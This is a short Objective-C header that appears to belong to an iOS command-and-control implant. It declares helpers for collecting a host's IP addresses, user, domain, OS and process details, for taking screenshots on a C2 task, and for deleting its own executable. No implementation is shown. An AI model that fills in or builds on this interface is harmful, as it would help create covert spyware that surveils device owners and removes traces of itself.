#import <Foundation/Foundation.h>
#import <ifaddrs.h>
#import <arpa/inet.h>
#import <sys/types.h>
#import <sys/sysctl.h>
#import <UIKit/UIKit.h>
#include <mach-o/dyld.h>
// #import <IOKit/IOKitLib.h>
// #import <CoreGraphics/CoreGraphics.h>

#import "C2Task.h"

@interface SystemInfoHelper : NSObject

+ (NSString *)getInternalIPAddress;
+ (NSString *)getExternalIPAddress;
+ (NSString *)getArchitecture;
+ (NSInteger)getPID;
+ (NSString *)getUser;
+ (NSString *)getHost;
+ (NSString *)getOS;
+ (NSString *)getDomain;
+ (BOOL)deleteExecutable;
+ (NSString *)getProcessName;
+ (void)takeScreenshotWithTask:(C2Task *)task;

@end
